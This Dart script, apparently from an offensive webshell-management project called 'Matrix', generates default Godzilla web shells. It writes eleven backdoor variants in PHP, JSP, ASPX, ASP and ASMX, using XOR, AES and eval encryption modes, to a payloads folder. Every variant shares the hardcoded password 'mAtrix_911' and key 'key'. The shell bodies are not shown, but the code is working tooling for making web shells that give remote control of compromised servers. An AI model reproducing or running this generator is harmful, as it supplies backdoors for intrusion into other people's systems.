// 用 Matrix 的 Godzilla 壳生成器渲染「内置默认马」，供 SeedService 种子化。
//
//   dart run tool/godzilla_engine/render_default_shells.dart
//
// 默认账号与 Matrix 的其它内置马一致：密码 mAtrix_911，secretKey key。
import 'dart:io';

import 'package:matrix/connectors/godzilla/godzilla_shell_generator.dart';

const _password = 'mAtrix_911';
const _secretKey = 'key';

const _targets = <GodzillaCryption, String>{
  GodzillaCryption.phpXorBase64: 'godzilla_php_xor_base64.php',
  GodzillaCryption.phpXorRaw: 'godzilla_php_xor_raw.php',
  GodzillaCryption.phpEvalXorBase64: 'godzilla_php_eval_xor_base64.php',
  GodzillaCryption.javaAesBase64: 'godzilla_jsp_aes_base64.jsp',
  GodzillaCryption.javaAesRaw: 'godzilla_jsp_aes_raw.jsp',
  GodzillaCryption.csharpAesBase64: 'godzilla_aspx_aes_base64.aspx',
  GodzillaCryption.aspXorBase64: 'godzilla_asp_xor_base64.asp',
  GodzillaCryption.aspRaw: 'godzilla_asp_raw.asp',
  GodzillaCryption.csharpAsmxAesBase64: 'godzilla_csharp_asmx_aes_base64.asmx',
  GodzillaCryption.csharpEvalAesBase64: 'godzilla_csharp_eval_aes_base64.aspx',
  GodzillaCryption.aspEvalBase64: 'godzilla_asp_eval_base64.asp',
};

Future<void> main() async {
  final dir = Directory('assets/defaults/payloads/godzilla');
  await dir.create(recursive: true);
  for (final entry in _targets.entries) {
    final shell = await GodzillaShellGenerator.generate(
      cryption: entry.key,
      password: _password,
      secretKey: _secretKey,
    );
    final file = File('${dir.path}/${entry.value}');
    await file.writeAsString(shell.content);
    stdout.writeln(
      '${entry.value.padRight(38)} ${entry.key.id.padRight(22)} ${shell.byteLength}B',
    );
  }
  exit(0);
}
